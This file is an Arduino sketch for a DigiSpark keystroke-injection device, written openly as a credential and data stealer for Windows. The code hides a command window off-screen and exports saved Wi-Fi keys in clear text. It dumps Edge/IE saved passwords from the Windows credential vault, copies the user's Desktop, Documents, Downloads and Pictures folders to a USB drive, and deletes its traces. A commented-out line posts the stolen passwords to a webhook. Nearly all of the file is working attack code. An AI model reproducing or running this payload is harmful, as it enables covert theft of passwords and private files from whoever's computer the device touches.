/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  

  //==========================================================================================================
  //====                                      Wi-Fi Password Stealer                                      ====
  //==========================================================================================================
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  //DigiKeyboard.delay(100);   //Original command from https://github.com/MTK911/Attiny85/blob/master/payloads/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino
  //This amount of delay above (100 milliseconds) seems to causes the command below ("cmd /k mode con: cols=15 lines=1") to skip over at least the first character "c"
  //Will be safer to have the delay being this (500 milliseconds)
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);

  //Original code from https://github.com/MTK911/Attiny85/blob/master/payloads/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino
  //DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  
  //Will instead have it transfer over to a USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Move-Item -Path './Wi-Fi-PASS' -Destination 'D:/Wi-Fi-Passwords/' -Force");
  
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  //==========================================================================================================


  //==========================================================================================================
  //====                                  Saved Browser Password Stealer                                  ====
  //==========================================================================================================
  DigiKeyboard.delay(3000);   //Waits/delays for 3 seconds
  
  //Stealing passwords saved in IE/Edge
  //Got code from https://kylemistele.medium.com/stealing-saved-browser-passwords-your-new-favorite-post-exploitation-technique-c5e72c86159a
  //and slightly modified/update it to send the passwords/credentials into a new file ("IE_EDGE_credentials.txt")
  DigiKeyboard.println("powershell [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  DigiKeyboard.println("powershell $vault = New-Object Windows.Security.Credentials.PasswordVault");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  DigiKeyboard.println("powershell $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | Out-File ./IE_EDGE_credentials.txt");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second

  //Will copy/transfer the file over to a USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Copy-Item -Path './IE_EDGE_credentials.txt' -Destination 'D:/IE_EDGE_credentials/' -Force");
  DigiKeyboard.delay(1000);   //Waits/delays for 1 second
  DigiKeyboard.println("del IE_EDGE_credentials.txt /s /f /q"); //cleaning up all the mess
  //==========================================================================================================


  //==========================================================================================================
  //====                                  IMPORTANT File & Folder Stealer                                 ====
  //==========================================================================================================
  DigiKeyboard.delay(3000);   //Waits/delays for 3 seconds

  //COPIES the user's Desktop folder (including all subfolders and their contents) to the USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Copy-Item -Path C:/Users/$env:USERNAME/Desktop/ -Destination 'D:/IMPORTANT_files_folders/' -Recurse");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  //COPIES the user's Downloads folder (including all subfolders and their contents) to the USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Copy-Item -Path C:/Users/$env:USERNAME/Downloads/ -Destination 'D:/IMPORTANT_files_folders/' -Recurse");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  //COPIES the user's Documents folder (including all subfolders and their contents) to the USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Copy-Item -Path C:/Users/$env:USERNAME/Documents/ -Destination 'D:/IMPORTANT_files_folders/' -Recurse");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  //COPIES the user's Pictures folder (including all subfolders and their contents) to the USB flash drive (i.e. D: drive)
  DigiKeyboard.println("powershell Copy-Item -Path C:/Users/$env:USERNAME/Pictures/ -Destination 'D:/IMPORTANT_files_folders/' -Recurse");
  DigiKeyboard.delay(500);   //Waits/delays for 1/2 a second
  //==========================================================================================================
  
  
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}